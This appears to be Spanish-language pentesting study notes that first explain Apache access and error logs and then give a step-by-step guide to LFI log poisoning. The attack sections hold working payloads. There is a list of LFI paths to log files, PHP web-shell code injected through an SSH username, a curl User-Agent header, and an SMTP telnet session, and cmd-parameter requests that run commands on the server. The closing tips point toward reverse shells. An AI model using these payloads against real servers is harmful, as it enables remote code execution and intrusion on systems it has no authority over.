# Índice
- [📝¿QUÉ ES UN LOG?](#log)
- [📁Ubicación de los logs](#ubicacion)
- [🛠️Configuración](#configuración)
- [🔥Tipos de logs en Apache](#tipos)
  - [1️⃣ Access log (`access.log`)](#1)
  - [2️⃣ Error log (`error.log`)](#2)
- [💣LFI, LOG POISONING](#lfi)
- [📡Verificar si el servidor interpreta PHP en los logs](#verificar)
- [📝Resumen](#resumen)
- [📧Ataques vía mail](#mail)
- [🎯Consejos finales](#consejos)

<a name="log"></a>
## 📝¿QUÉ ES UN LOG?

Un log en **Apache** es un archivo donde el servidor web **Apache HTTP Server** registra información sobre su actividad.

Estos registros son útiles para:

- monitorear el tráfico del sitio web
- diagnosticar errores
- analizar el rendimiento
- detectar posibles ataques o comportamientos anómalos
<a name="ubicacion"></a>
## 📁Ubicación de los logs

La ubicación depende de la configuración y del sistema operativo, pero comúnmente:

- **Linux:** `/var/log/apache2/` o `/var/log/httpd/`
- **Windows:** dentro del directorio de instalación de Apache

<a name="configuración"></a>
## 🛠️Configuración

Los logs se configuran en el archivo de configuración de Apache (`httpd.conf` o `apache2.conf`) mediante las siguientes directivas:

```apache
CustomLog "/var/log/apache2/access.log" combined
ErrorLog "/var/log/apache2/error.log"
```

<a name="tipos"></a>
## 🔥Tipos de logs en Apache

<a name="1"></a>
### 1️⃣ Access log (`access.log`)

El *Access log* registra **cada solicitud que recibe el servidor**.

Incluye información como:

- dirección IP del visitante  
- fecha y hora de la solicitud  
- página o recurso solicitado  
- código de estado HTTP (200, 404, 500, etc.)  
- navegador del cliente (User-Agent)  

**Ejemplo de línea típica:**  
```172.17.0.2 - - [06/Jun/2025:12:34:56 +0000] "GET /index.html HTTP/1.1" 200 1024```

<a name="2"></a>
### 2️⃣ Error log (`error.log`)

El *Error log* registra **mensajes de error y advertencias del servidor**.

Incluye:

- errores de configuración  
- errores de permisos  
- scripts que fallan (por ejemplo, en PHP)  
- problemas de red o hardware  

**Ejemplo de línea típica:**  
```
[Fri Jun 06 12:34:56.789012 2025] [core:error] [pid 1234] [client 192.168.1.1:54321] File does not exist: /var/www/html/missing-page.html
```

<a name="lfi"></a>
### 💣LFI, LOG POISONING

Sabiendo lo que son los logs, si llegamos a tener acceso a ellos, podemos intentar aprovecharlo para ejecutar código malicioso.

Si tenemos acceso a los archivos de logs mediante una vulnerabilidad LFI, por ejemplo:

```
http://example.com/index.php?page=/var/log/apache/access.log
http://example.com/index.php?page=/var/log/apache/error.log
http://example.com/index.php?page=/var/log/apache2/access.log
http://example.com/index.php?page=/var/log/apache2/error.log
http://example.com/index.php?page=/var/log/nginx/access.log
http://example.com/index.php?page=/var/log/nginx/error.log
http://example.com/index.php?page=/var/log/vsftpd.log
http://example.com/index.php?page=/var/log/sshd.log
http://example.com/index.php?page=/var/log/mail
http://example.com/index.php?page=/var/log/httpd/error_log
http://example.com/index.php?page=/usr/local/apache/log/error_log
http://example.com/index.php?page=/usr/local/apache2/log/error_log
```

Y sabemos que el puerto 22 (SSH) está abierto, la idea es intentar una conexión SSH fallida que reporte el error al log.

Al tener acceso al archivo de log, podremos ver ese reporte y entonces, ¿qué podemos hacer?  
Pues **mandar código PHP malicioso** para intentar inyectarlo en el log.

### Ejemplo de intento de inyección vía conexión SSH:

```bash
ssh "<?php system('id'); ?>" 172.17.0.2
```

Si en el log logramos ver algo como:

```
[Fri Jun 06 12:34:56.789012 2025] [php:error] [pid 1234] [client 172.17.0.2:54321] uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

habremos conseguido que el log muestre la salida del comando `id`.

Con esto podemos leer salidas en el log, y también archivos del sistema, como `/etc/passwd` para listar usuarios, etc.

---
<a name="verificar"></a>
### 📡Verificar si el servidor interpreta PHP en los logs

Si además el servidor interpreta PHP dentro de esos logs, podemos enviar código malicioso directamente con `curl`:

```bash
curl http://172.17.0.2/ -A "<?php system(\$_GET['cmd']);?>"
```

Aquí, el código PHP `<?php system(\$_GET['cmd']); ?>` hace lo siguiente:

- -A (o --user-agent) define el valor de la cabecera User-Agent que enviamos en la petición HTTP
- `system()` es una función de PHP que ejecuta un comando en el sistema operativo.
- `\$_GET['cmd']` toma el valor del parámetro `cmd` que se pasa en la URL.
- Así, cuando se accede a la URL con `&cmd=algún_comando`, el servidor ejecuta ese comando y muestra la salida.

Por eso, en la siguiente solicitud inyectaremos un comando:

```bash
curl "http://172.17.0.2/test.php?page=/var/log/apache2/access.log&cmd=id"
```

o desde el navegador:

```
http://172.17.0.2/test.php?page=/var/log/apache2/access.log&cmd=id
```

el parámetro `cmd=id` indica que queremos ejecutar el comando `id`.

Si logramos incrustar código PHP en el log y que luego sea interpretado, podremos ejecutar comandos arbitrarios en el servidor.

---

<a name="resumen"></a>
📝**Resumen:**  
- Accedemos a archivos de logs vía LFI  
- Inyectamos código PHP malicioso en los logs (log poisoning)  
- Si el log se interpreta como PHP, ejecutamos código remoto usando el parámetro `cmd` para pasar el comando  
- Esto permite ejecutar comandos en el servidor y leer archivos sensibles

<a name="mail"></a>
📧En algunos casos podremos hacer lo mismo vía mail

Si está abierto el puerto 25, que es el puerto estándar para el protocolo SMTP (envío de correo):

```bash
mail -s "<?php system(\$_GET['cmd']); ?>" www-data@10.10.10.10 < /dev/null
```
Este comando envía un correo con un payload PHP en el asunto al usuario www-data.

O directamente mandando un mail, supongamos que sabemos de la existencia de www-data:
```bash
telnet 172.17.0.2 25

HELO localhost

MAIL FROM:<root>

RCPT TO:<www-data>

DATA

<?php
echo shell_exec(\$_REQUEST['cmd']);
?>
.
QUIT
```
Aquí abrimos una sesión SMTP vía telnet, enviamos un correo con código PHP malicioso que ejecuta comandos recibidos por el parámetro cmd.
El punto . indica el fin del cuerpo del mensaje, y QUIT cierra la conexión.

Luego ejecutaremos:
```
curl "http://172.17.0.2/test.php?page=../../../../../var/mail/www-data&cmd=id"
```
Con esta petición accedemos al archivo de correo de www-data usando LFI y ejecutamos el comando id para obtener información del usuario.

O vía URL:
```
http://172.17.0.2/test.php?page=../../../../../var/mail/www-data&cmd=id
```
Es lo mismo que el curl pero desde un navegador.

Notas importantes:

  -Se usa shell_exec en el payload PHP para ejecutar comandos del sistema recibidos a través del parámetro cmd.

  -La ruta ../../../../../var/mail/www-data accede al archivo de correo del usuario www-data mediante LFI.

  -Es fundamental usar &cmd=id para añadir el parámetro que ejecuta el comando en el PHP inyectado.

  -El puerto 25 es el estándar para SMTP y debe indicarse en la conexión telnet.

  -El punto . en telnet indica el fin del mensaje SMTP.

<a name="consejos"></a>
 ### 🎯CONSEJOS FINALES

-Si logramos leer los log enviar una consulta el php y ver si se interpreta en el log 

-si se interpreta intentar inyectar un comando malicioso

-las peticiones del comando malicioso normalmente &cmd=<COMANDO O COMANDOS> van a terminar siendo una reverse shell, URLencodearlas para que se interpreten mejor
    
    lo encodeamos en páginas como https://www.urlencoder.org/
   
    las reverse se pueden ver en https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

-sabiendo los puertos abiertos sabremos como intentar atacar los log, 22 SSH con codigo enviado por ssh o 25 SMTP enviado en un correo
